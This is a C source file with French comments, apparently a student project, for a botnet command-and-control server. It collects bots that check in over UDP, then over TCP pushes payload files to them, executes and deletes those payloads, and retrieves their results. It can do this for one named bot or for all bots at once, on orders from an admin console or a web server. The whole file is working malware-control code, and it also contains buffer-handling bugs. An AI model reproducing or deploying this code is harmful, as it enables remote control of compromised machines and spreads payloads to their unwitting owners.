#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <poll.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <stdbool.h>

/* Pour boucle TCP */
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include "libreseau.h"
#include "libipc.h"
#include "libthread.h"
#include "liste.h"

#define BOTRESET 20
#define ID_SIZE 7
#define PORT_SIZE 5
#define IP_SIZE 16

/** GLOBAL VARIABLES **/
char protocole_upload[5][13]= {"OKupload\n", "OKname_size\n", "OKname\n", "OKdata_size\n", "bye\n"};
char protocole_execut[5][13]= {"OKexecute\n", "OKname_size\n", "OKname\n", "bye\n", "NOKname\n"};
char protocole_delete[5][13]= {"OKdelet\n", "OKname_size\n", "OKname\n", "bye\n", "NOKname\n"};
char protocole_result[5][13]= {"OKresult\n", "OKid\n", "bye\n", "bye\n", "NOKid\n"};
struct sigaction action;
int s_UDP;
int run = 1;
int admin_rcv = 0;
int msgid1;
int msgid2;
int idshm;
Msg_requete message1, reponse;
Mem_partage web_c;
Mem_partage *webc = &web_c;
Liste liste_boat;


/** PROTOTYPES **/
void protocole_STAT(void *param_proto);
void protocole_QUIT(void *param_proto);
void protocole_UPLOAD(void *param_proto);
void protocole_EXECUTE(void *param_proto);
void protocole_DELETE(void *param_proto);
void protocole_RESULT(void * param_proto);
void send_liste(Liste liste_boat, int source);
void IPC_f(void *p_param_IPC);
int traitement_msgUDP (unsigned char *r_msg, int entier, char *ip);
void lancerServeurUDP(void *p_param_SUDP);
int boucleServeurUDP(int s,int (*traitement)(unsigned char *,int, char*));
int get_socketTCP(char *boat_name, Cellule **boat, int create, int source);
int aller_retour(char *snd, char *rcv, int socket, char *verif, int sens);
void gestion_listBoat();
void hand (int sig);


/** STRUCTURES UTILES **/
/* Structure de paramètre pour les fonction UDP */
typedef struct {
	char *port;
	char *ip_destination;
}parametres_UDP;

/* Structure de paramètre pour la fonction IPC (entre Admin et CandC)  */
typedef struct {
    int typeMSG_cible;  //Permet d'attendre message IPC du type message.type voulu
    int needCHARGE;     //Précise si une charge doit être passée en paramètre
    int needBOAT;	//Précise si un boat doit être passé en paramètre
    int creatCOMMUNICATION; //Précise si une socket est nécessaire entre le CandC et le boat
    void *protocole;	//Fonction à executer
}parametres_IPC;

/* Structure de paramètre pour les différents protocoles */
typedef struct {
        Cellule *boat;  //Un boat
        int socket;	//Une socket
	int source;	//Provenance de l'ordre (admin (0) ou webserver (1))
        char *chemin;   //Chemin d'une charge si nécessaire
}param_protocol;





/** SOME FONCTIONS **/
void hand (int sig) {
  if(sig == SIGINT) {
    run = 0;
    printf("\nFin du programme\n");
    detruire_liste(&liste_boat);
    msgctl(msgid1, IPC_RMID, 0);
    msgctl(msgid2, IPC_RMID, 0);
    exit(-1);
  }
}



/*
Fonction qui assure le lien entre le webserver.c et le CandC.
Une mémoire partagée est utilisée
*/
void com_webserver()
{
    idshm = shmget (CLE_MEM, 200 , IPC_CREAT | 0666);
    webc = shmat(idshm , NULL , 0);
    webc->type = 0;
    param_protocol *p_param;
    while(1) {
        while(webc->type != 1); //Le changement du type sert de signal de départ
     	p_param = malloc(sizeof(param_protocol));
        p_param->source = 1; //L'ordre provient du webserver (1)

        if(strcmp(webc->consigne, "LIST") == 0) {
       	    printf("WEBC liste\n");
	    send_liste(liste_boat,1);
        }
        else if(strcmp(webc->consigne, "STAT") == 0) {
            printf("WEBC stat\n");
	    p_param->socket = get_socketTCP( webc->boat, &(p_param->boat), 1, 1);
	    protocole_STAT(p_param);
        }
        else if(strcmp(webc->consigne, "QUIT") == 0) {
            printf("WEBC quit\n");
            p_param->socket = get_socketTCP( webc->boat, &(p_param->boat), 0, 1);
	    protocole_QUIT(p_param);
        }
        else if(strcmp(webc->consigne, "DELE") == 0) {
            printf("WEBC dele\n");
	    p_param->chemin = malloc(sizeof(webc->charge));
            strcpy(p_param->chemin, webc->charge);
            p_param->socket = get_socketTCP( webc->boat, &(p_param->boat), 1, 1);
	    protocole_DELETE(p_param);
            printf("REP : %s\n", webc->reponse);
        }
        else if(strcmp(webc->consigne, "EXEC") == 0) {
            printf("WEBC exec\n");
	    p_param->chemin = malloc(sizeof(webc->charge));
            strcpy(p_param->chemin, webc->charge);
            p_param->socket = get_socketTCP( webc->boat, &(p_param->boat), 1, 1);
	    protocole_EXECUTE(p_param);
            printf("REP : %s\n", webc->reponse);
        }
        else if(strcmp(webc->consigne, "RESU") == 0) {
            printf("WEBC resu\n");
	    p_param->chemin = malloc(sizeof(webc->charge));
            strcpy(p_param->chemin, webc->charge);
            p_param->socket = get_socketTCP( webc->boat, &(p_param->boat), 1, 1);
	    protocole_RESULT(p_param);
            printf("REP : %s\n", webc->reponse);
        }
        else {
            printf("WEBC uplo\n");
            p_param->chemin = malloc(sizeof(webc->charge));
            strcpy(p_param->chemin, webc->charge);
            p_param->socket = get_socketTCP( webc->boat, &(p_param->boat), 1, 1);
            protocole_UPLOAD(p_param);
            printf("REP : %s\n", webc->reponse);
        }
        webc->type = 0;
    }
}
void (*p_communicationWEBC) = &com_webserver;






/*
Permet l'envoie de char *snd puis la reception de char *rcv dans la socket
Permet de vérifier si la chaine reçu correspond au protocole (char *verif)
Permet d'inverser envoie et reception grace à int sens
*/
int aller_retour(char *snd, char *rcv, int socket, char *verif, int sens)
{
    printf("fonction aller_retour\n");
    memset(rcv,0,TAILLE_MSG);
    if (sens == 1) {
        /* ALLER */
        send( socket, snd, TAILLE_MSG, 0 );
        /* RETOUR */
        recv( socket, rcv, TAILLE_MSG, 0 );
	printf("receive %s\n", rcv);
        if (strcmp(rcv, verif) == 0) return 0;
        return -1;
    }
    else {
        /* RETOUR */
        recv( socket, rcv, TAILLE_MSG, 0 );
        printf("receive %s\n",rcv);
        if (strcmp(rcv, verif) == 0) {
            /* ALLER */
            send( socket, snd, TAILLE_MSG, 0 );
            return 0;
        }
        memset(snd,0,TAILLE_MSG+1);
        return -1;
    }
}



/* Envoie le résultat d'un protocole en direction du webserver ou de l'admin (en fonction de la provenance de l'ordre) */
void send_rep(int source) {
    if (source == 0) {	//Source = 0 -> admin (file de messages)
        msgsnd(msgid2, &reponse, TAILLE_MSG, reponse.type); }
    if (source == 1) {	//Source = 1 -> webserver (mémoire partagée)
        while(webc->type != 1);
        strcpy(webc->reponse,reponse.texte);
	webc->type = 0; }
}






/* Envoie l'état d'un boat */
void protocole_STAT(void *param_proto)
{
    printf("protocoleSTAT\n");
    param_protocol *param = param_proto;
    memset(reponse.texte,0,TAILLE_MSG);
    if (param->socket < 0) return;

    char buff[TAILLE_MSG];
    int cb = sprintf( buff, "STAT" );

    cb = send( param->socket, buff, cb, 0 );
    memset(reponse.texte, 0, TAILLE_MSG);
    cb = recv( param->socket, reponse.texte, TAILLE_MSG, 0 );

    webc->finish = 1;
    send_rep(param->source);
    return;
}
void (*p_protocole_STAT) = &protocole_STAT;





/* Close la liaison TCP entre le C&C et un boat */
void protocole_QUIT(void *param_proto)
{
    printf("protocoleQUIT\n");
    memset(reponse.texte,0,TAILLE_MSG);

    param_protocol *param = param_proto;
    char message_send[TAILLE_MSG];
    if (param->socket > 0) {
	/*Si une connexion TCP existe entre les deux on coupe la connexion */
        sprintf( message_send, "QUIT" );
        send( param->socket, message_send, sizeof(message_send), 0 );
        close(param->socket);
        (param->boat)->connect = 0;

	/* Reponse pour admin */
	strcpy(reponse.texte, "FREE_");
	strcat(reponse.texte, (param->boat)->nom);

	webc->finish = 1;
        send_rep(param->source);
    }
    else {
        (param->boat)->connect = 0;
	if(param->socket == -2) {
	    /* Si aucune connexion TCP n'existait - Reponse pour admin */
	    strcpy(reponse.texte, "NON_CONNECT_");
	    strcat(reponse.texte, (param->boat)->nom);

	    webc->finish = 1;
            send_rep(param->source);
        }
    }
}
void (*p_protocole_QUIT) = &protocole_QUIT;







/* Envoie une charge au boat */
void protocole_UPLOAD(void *param_proto)
{
    printf("protocoleUPLOAD\n");
    memset(reponse.texte,0,TAILLE_MSG);

    param_protocol *param = param_proto;
    /** Aucune socket trouvée <=> boat absent de la liste, on return */
    if (param->socket < 0) return;

    /* Ouverture de la charge + obtention de la taille */
    FILE* charge = NULL;

    char *strToken = malloc(strlen(param->chemin));
    char *filename = malloc(strlen(param->chemin));
    strcpy(strToken, param->chemin);
    strcpy(filename, param->chemin);
    strToken = strtok ( strToken, "/");
    while ( strToken != NULL ) {
	strcpy(filename, strToken);
        strToken = strtok ( NULL, "/");
    }

    charge = fopen(param->chemin,"a+");
    if(charge == NULL) {
        strcpy(reponse.texte,"charge ERROR");
        send_rep(param->source);
        return;
    }
    fseek(charge, 0, SEEK_END);
    int data_size = ftell(charge);
    rewind(charge);
    char data_send[5][TAILLE_MSG];
    char data_receive[TAILLE_MSG];
    memset(data_receive,0,TAILLE_MSG);
    sprintf( data_send[0], "upload?\n");
    sprintf( data_send[1], "%ld\n",strlen(filename));
    sprintf( data_send[2], "%s\n", filename);
    sprintf( data_send[3], "%d\n",data_size);
    sprintf( data_send[4], "bye\n");


    int continu = 0;
    int i = 0;
    sleep(5);
    while (i<4 && continu== 0) {
        continu = aller_retour(data_send[i], data_receive, param->socket, protocole_upload[i], 1);
	i ++;
    }
    if (i==4 && continu==0) {
        /* OK pour envoi */
        char octet[1];
        for(int i = 0; i<data_size; i++) {
            fread(octet,1,1,charge);
            send(param->socket, octet, 1, 0 );
        }
	strcpy(reponse.texte,"upload_sur_");
    }
    else {
	strcpy(reponse.texte,"ECHEC_upload_sur_");
    }

    fclose(charge);

    aller_retour(data_send[4], data_receive, param->socket, protocole_upload[4], 0);

    strcat(reponse.texte,(param->boat)->nom);
    send_rep(param->source);

    free(strToken);
    free(filename);
    return;
}
void (*p_protocole_UPLOAD) = &protocole_UPLOAD;





/* Permet l'execution d'une charge si elle est présente sur une boat */
void protocole_EXECUTE(void *param_proto)
{
    printf("protocoleEXECUTE\n");
    memset(reponse.texte,0,TAILLE_MSG);

    param_protocol *param = param_proto;
    /** Aucune socket trouvée <=> boat absent de la liste, on return */
    if (param->socket < 0) return;

    char data_send[5][TAILLE_MSG];
    char data_receive[5][TAILLE_MSG];
    char id_result[TAILLE_MSG];

    memset(id_result,0,TAILLE_MSG);
    sprintf( data_send[0], "execute?\n");
    sprintf( data_send[1], "%ld\n",strlen(param->chemin));
    sprintf( data_send[2], "%s\n", param->chemin);
    sprintf( data_send[3], "OKid\n");
    sprintf( data_send[4], "bye\n");

    int continu = 0;
    int i = 0;
    while (i<4 && continu == 0) {
        continu = aller_retour(data_send[i], data_receive[i], param->socket, protocole_execut[i], 1);
	if (i==2 && continu==0) {
            recv(param->socket, id_result, TAILLE_MSG, 0);
	}
        i +=1;
    }
    if (i == 3) {
	printf("Charge_ABSENTE_de_\n");
        strcpy(reponse.texte,param->chemin);
        strcat(reponse.texte,"Charge_ABSENTE_de_");
    }
    else {
        send(param->socket, data_send[4], TAILLE_MSG, 0);
        strcpy(reponse.texte,"ID_execution_: ");
        strcat(reponse.texte,id_result);
    }
    strcat(reponse.texte,(param->boat)->nom);

    webc->finish = 1;
    send_rep(param->source);

    return;
}
void (*p_protocole_EXECUTE) = &protocole_EXECUTE;






/* Permet la suppression d'une charge si elle est présente sur un boat */
void protocole_DELETE(void *param_proto)
{
    printf("protocoleDELETE\n");
    memset(reponse.texte,0,TAILLE_MSG);

    param_protocol *param = param_proto;
    /** Aucune socket trouvée <=> boat absent de la liste, on return */
    if (param->socket < 0) return;

    char data_send[5][TAILLE_MSG];
    char data_receive[TAILLE_MSG];

    memset(data_receive,0,TAILLE_MSG);
    sprintf( data_send[0], "delet?\n");
    sprintf( data_send[1], "%ld\n",strlen(param->chemin));
    sprintf( data_send[2], "%s\n", param->chemin);
    sprintf( data_send[3], "bye\n");

    int continu = 0;
    int i = 0;
    while (i<4 && continu == 0) {
        continu = aller_retour(data_send[i], data_receive, param->socket, protocole_delete[i], 1);

	if (i==2 && continu==0) {
	    printf("Suppression effectuée\n");
            strcpy(reponse.texte,"DELETE_de_");
            strcat(reponse.texte,param->chemin);
	    strcat(reponse.texte, "_sur_");
	}
        else if (i==2 && continu==-1){
            printf("Charge non présente sur le boat\n");
            strcpy(reponse.texte,param->chemin);
            strcat(reponse.texte,"Charge_ABSENTE_de_");
	}
	i +=1;
    }
    strcat(reponse.texte,(param->boat)->nom);

    webc->finish = 1;
    send_rep(param->source);
    return;
}
void (*p_protocole_DELETE) = &protocole_DELETE;






/* Permet d'obtenir le résultat liée à une charge */
void protocole_RESULT(void * param_proto) {

    printf("protocoleRESULT\n");
    memset(reponse.texte,0,TAILLE_MSG);

    param_protocol *param = param_proto;
    /** Aucune socket trouvée on return */
    if (param->socket < 0) return;
    webc->finish = 0;

    char data_receive[5][TAILLE_MSG];
    char data_send[5][TAILLE_MSG];
    char n_octet[TAILLE_MSG];
    int nb_octet = 0;
    int continu = 0;
    int i = 0;

    sprintf( data_send[0], "result?\n");
    sprintf( data_send[1], "%s\n",param->chemin);
    sprintf( data_send[2], "OKresult_size\n");
    sprintf( data_send[3], "bye\n");

    while (i<4 && continu == 0) {
        continu = aller_retour(data_send[i], data_receive[i], param->socket, protocole_result[i], 1);
        if (i==1 && continu==0) {
            recv(param->socket, n_octet,TAILLE_MSG,0);
	    nb_octet = atoi(n_octet);
	    reponse.nbOctet = nb_octet;
	    send(param->socket,data_send[2],TAILLE_MSG,0);

	    /* Reception fichier et transmission */
        if(param->source==1){
               msgsnd(msgid2, &reponse, TAILLE_MSG, reponse.type);
        }
	    char octet[1];
	    for(int j =0; j<nb_octet; j++) {
		memset(reponse.texte, 0, TAILLE_MSG);
	        memset(octet, 0, TAILLE_MSG);
                recv(param->socket,octet,1,0);
                strcpy(reponse.texte,octet);
		printf("%s", reponse.texte);
		if(j == nb_octet-1) {
		    webc->finish = 1;
		}
                send_rep(param->source);
	    }
	    i = 2;
        }
        i +=1;
    }

    if (i==2) {
        reponse.nbOctet=0;
	strcpy(reponse.texte, "FALSE_ID");
        webc->finish = 1;
        send_rep(param->source);

    }
    return;
}
void (*p_protocole_RESULT) = &protocole_RESULT;





/* Transmet les boats trouvés à l'admin ou au webserver */
void send_liste(Liste liste_boat, int source)
{
    webc->finish = 0;
    printf("protocoleLIST\n");
    reponse.type = 2;
    memset(reponse.texte,0,TAILLE_MSG);

    Cellule *tmp = liste_boat;
    if (tmp != NULL) {
        strcpy(reponse.texte, tmp->nom);
	send_rep(source);
        if(source == 0) {
            strcpy(reponse.texte, tmp->ip);
	    reponse.type = 2;
            msgsnd(msgid2, &reponse, TAILLE_MSG, reponse.type);
	    }
        send_liste(tmp->suiv,source);
    }
    else {
        strcpy(reponse.texte,"");
	reponse.type = 1;
	webc->finish = 1;
        send_rep(source);
    }
    return;
}





/*
PIECE MAITRAISE : Fonction utlisée dans le thread IPC pour communiquer avec l'admin.
En fonction du paramètres p_param_IPC, la fonction va permettre d'écouter un type de
message IPC précis (chaque type correspondant à un protocole (STAT QUIT etc..)
En fonction du protocole, la fonction fournira les paramètres nécessaire (boat, socket, charge) dans une structure
*/
void IPC_f(void *p_param_IPC) {

    parametres_IPC *param = p_param_IPC;
    param_protocol *p_param;
    while(run == 1)
    {
        /* Reception d'un message de type TYPEMSG_CIBLE */
	msgrcv(msgid1, &message1, sizeof(Msg_requete), param->typeMSG_cible, 0);
        if (run != 1) return;
	p_param = malloc(sizeof(param_protocol));
        p_param->source = 0; //L'ordre provient de l'admin (0)

	int nbBoat = 0;
	reponse.nbBoat = message1.nbBoat;
	/* Si une charge est nécessaire (pour le protocole UPLOAD, EXEC, DELETE OU RESULT) */
	if (param->needCHARGE == 1) {

	    /* Recupération du path complet de la charge */
	    int nb_msg = message1.t_chemin / 20;
	    p_param->chemin = malloc(message1.t_chemin);
	    strcpy(p_param->chemin, message1.texte);
	    int cpt = 1;
	    /* Si le chemin de la charge est plus grand qu'un message IPC, on boucle pour le récupérer en totalité */
	    while (cpt <= nb_msg) {
		msgrcv(msgid1, &message1, TAILLE_MSG, param->typeMSG_cible, 0);
		strcat(p_param->chemin, message1.texte);
		cpt ++;
	    }
	}

	/* Si un boat est nécessaire pour le protocole (Tous les protocoles sauf LIST) */
	if (param->needBOAT == 1) {
	    /* Recupération du protocole (STAT QUIT etc...) */
	    void (*fonction)(void *) = param->protocole;
	    if (param->needCHARGE) {
                msgrcv(msgid1, &message1, TAILLE_MSG, param->typeMSG_cible, 0);
            }

	    /* Gestion de la commande ALL, qui effectuera une action pour tous les boat connu alors */
	    if (strcasecmp(message1.texte, "ALL") == 0 && message1.type != 7) {
		/* COMMANDE ALL POUR TOUT LES PROTOCOLES SAUF RESULT (TYPE 7) */
		Cellule *tmp = liste_boat;
		memset(message1.texte, 0, TAILLE_MSG);
		while (tmp != NULL) {
		    p_param->socket = get_socketTCP( tmp->nom, &(p_param->boat), param->creatCOMMUNICATION, 0);
		    if (tmp->suiv != NULL) reponse.nbBoat ++;

		    /* Lancement du protocole */
                    fonction(p_param);
		    if (tmp->suiv == NULL) break;
		    tmp = tmp->suiv;
		}
		if(reponse.nbBoat==message1.nbBoat && tmp==NULL) {
            	    strcpy(reponse.texte, "Aucun boat détecté");
            	    msgsnd(msgid2, &reponse, TAILLE_MSG, reponse.type);
        	}
	    }

	    /* En l'absence de ALL, on récupère le ou les boat transmi par l'admin */
	    else {
	        /* Récupération du nom du ou des boats */
	        while (nbBoat < message1.nbBoat) {
		    if (nbBoat > 0) {
		        msgrcv(msgid1, &message1, TAILLE_MSG, param->typeMSG_cible, 0);
		    }
                    p_param->socket = get_socketTCP( message1.texte, &(p_param->boat), param->creatCOMMUNICATION, 0);
		    /* Lancement du protocole */
		    fonction(p_param);
		    nbBoat ++;
	        }
	    }
	}
	/* Si aucune boat nécessaire -> protocole LIST */
	else if (param->needBOAT == 0) {
	    send_liste(liste_boat,0);
	}

	if (param->needCHARGE == 1) free(p_param->chemin);
        free(p_param);
    }
    return;
}
void (*p_IPC) = &IPC_f;




/*
Permet d'ouvrir ou d'obtenir une socket TCP pour communiquer avec un boat dont le nom est passé en paramètre
int create permet de savoir si une socket doit être ouverte (Non pour QUIT, oui pour STAT UPLOAD etc..)
int source permet de savoir si la requete provient du webserver ou de l'admin
*/
int get_socketTCP(char *boat_name, Cellule **boat, int create, int source) {
    printf("C&C get_socketTCP\n");
    int s_TCP;

    pointeur_boat(boat, liste_boat, boat_name);

    /* Si le boat est dans la liste */
    if (*boat != NULL) {
	/* Absence de socket pré-éxistante -> création d'une nouvelle */
	if ((*boat)->connect == 0) {
	    if( create == 0) return -2; //Return si on ne doit pas crée de socket 

            s_TCP=connexionServeurTCP((*boat)->ip, "4242");
            if(s_TCP<0){ fprintf(stderr,"Erreur de connexion au serveur\n"); exit(EXIT_FAILURE); }
            printf("Connexion au serveur TCP réussie %d\n", s_TCP);
	    /* Sauvegarde de la socket */
	    (*boat)->connect = 1;
	    (*boat)->socket = s_TCP;
	}
	/* Récupération de la socket si déjà pré-existante */
	else {
	    s_TCP = (*boat)->socket;
	}
    }

    /* Si boat inconnu au bataillon */
    else {
	printf("Aucun bot du nom de %s\n", boat_name);
	memset(reponse.texte, 0, TAILLE_MSG);
	strcpy(reponse.texte, "UNKNOW_");
	strcat(reponse.texte, boat_name);
	reponse.nbOctet = 0;

	/* Envoi de la réponse à la source correspondante */
	send_rep(source);
	s_TCP = -1;
    }
    return s_TCP;
}





/* Fonction qui traite le message reçu en UDP du bot */
int traitement_msgUDP (unsigned char *r_msg, int entier, char *ip)
{
    if (strlen((char *)r_msg) < 6 && entier != 10) return 0;

	/* Mise en forme pour l'ajout dans la liste */
	char *boat_info = malloc(TAILLE_MSG);
	/* 'A' pour ajout */
	strcpy(boat_info, "A*");
	strcat(boat_info, (char *)r_msg);
	strcat(boat_info, "*");
	strcat(boat_info, ip);
	strcat(boat_info, "*");
        strcat(boat_info, "4242");
	printf("info boat : %s\n", boat_info);
        ajout_tete(&liste_boat, boat_info);
	free(boat_info);

    	impression_liste(liste_boat);
    return 0;
}
int (*p_traitementUDP)(unsigned char *, int, char *) = &traitement_msgUDP;





/* Fonction qui permet d'écouter et de traiter par la méthode 'traitement' des messages UDP */
int boucleServeurUDP(int s,int (*traitement)(unsigned char *,int, char*)) {
    while(run == 1)
    {
        struct sockaddr_storage adresse;
        socklen_t taille=sizeof(adresse);
        unsigned char message[10];
	memset(message, 0, 10);
        /* Reception d'un message en UDP */
        int nboctets=recvfrom(s,message,10,0,(struct sockaddr*)&adresse,&taille);
        char *hote = malloc(MAX_TAMPON);
        char *service = malloc(MAX_TAMPON);
        if(hote==NULL){ perror("socketVersClient.malloc"); exit(EXIT_FAILURE); }
        if(service==NULL){ perror("socketVersClient.malloc"); exit(EXIT_FAILURE); }

        /* Recuperation des informations sur l'émetteur du message reçu */
        getnameinfo((struct sockaddr *)&adresse, sizeof(adresse), hote, MAX_TAMPON, service, MAX_TAMPON, NI_NUMERICHOST | NI_NUMERICSERV);
        if(nboctets<0) return -1;
        if(traitement(message,nboctets,hote)<0) break;
	free(hote);
	free(service);
    }
    return 0;
}


/* Comme son nom d'indique */
void lancerServeurUDP(void *p_param_SUDP)
{
    printf("C&C Thread UDP\n");

    /* Récupération des arguments : */
    parametres_UDP *param = p_param_SUDP;

    int s_UDP=initialisationSocketUDP(param->port);
    printf("Initialisation Socket UDP réussie\n");
    boucleServeurUDP(s_UDP,p_traitementUDP);
    close(s_UDP);
    free(param->port);
    free(param);
    return;
}
void (*p_lancerServeurUDP)(void *) = &lancerServeurUDP;



/* Refresh la liste de boat toute les 10 secondes */
void gestion_listBoat()
{
    int refresh_time = BOTRESET;
    printf("Refresh des BOAT non connectés toutes les %d secondes \n", refresh_time);
    while(run == 1) {
	sleep(refresh_time);
	suppression_ifCONNECT(&liste_boat);
	printf("REFRESH LISTE\n");
    }
    return;
}
void (*p_gestionBoat) = &gestion_listBoat;




int main() {

    action.sa_handler = hand;
    sigaction(SIGINT, &action, NULL);

    /* FILES DE MESSAGES */
    if ((msgid1 = msgget(CLE_MSG, IPC_CREAT | 0666)) == -1) {
      perror("msgget1\n");
      exit(1);
    }
    if ((msgid2 = msgget(CLE_MEM, IPC_CREAT | 0666)) == -1) {
      perror("msgget2\n");
      exit(1);
    }
    reponse.type = 5;

    /* PARAMETRES POUR LES THREAD LISTENER IPC */
    parametres_IPC listenSTAT = {1, 0, 1, 1, p_protocole_STAT};
    parametres_IPC listenQUIT = {2, 0, 1, 0, p_protocole_QUIT};
    parametres_IPC listenUPLO = {3, 1, 1, 1, p_protocole_UPLOAD};
    parametres_IPC listenDELE = {4, 1, 1, 1, p_protocole_DELETE};
    parametres_IPC listenLIST = {5, 0, 0, 0, send_liste};
    parametres_IPC listenEXEC = {6, 1, 1, 1, p_protocole_EXECUTE};
    parametres_IPC listenRESU = {7, 1, 1, 1, p_protocole_RESULT};

    /* Definition est remplissage de structures parametres */
    parametres_UDP *p_param_SUDP = malloc(sizeof(parametres_UDP));
    p_param_SUDP->port = malloc(PORT_SIZE);
    strcpy(p_param_SUDP->port, "4242");
    int taille = sizeof(parametres_UDP) + PORT_SIZE;

    initialisation(&liste_boat);

    /* LANCEMENT DES PROCESS */
    creer_process(p_lancerServeurUDP, p_param_SUDP, taille);
    creer_process(p_IPC, &listenUPLO, sizeof(listenUPLO));
    creer_process(p_IPC, &listenSTAT, sizeof(listenSTAT));
    creer_process(p_IPC, &listenQUIT, sizeof(listenQUIT));
    creer_process(p_IPC, &listenLIST, sizeof(listenLIST));
    creer_process(p_IPC, &listenDELE, sizeof(listenDELE));
    creer_process(p_IPC, &listenEXEC, sizeof(listenEXEC));
    creer_process(p_IPC, &listenRESU, sizeof(listenRESU));

    creer_process(p_communicationWEBC, NULL, 0);
    creer_process(p_gestionBoat, NULL, 0);

    while(1);

    return 0;
}
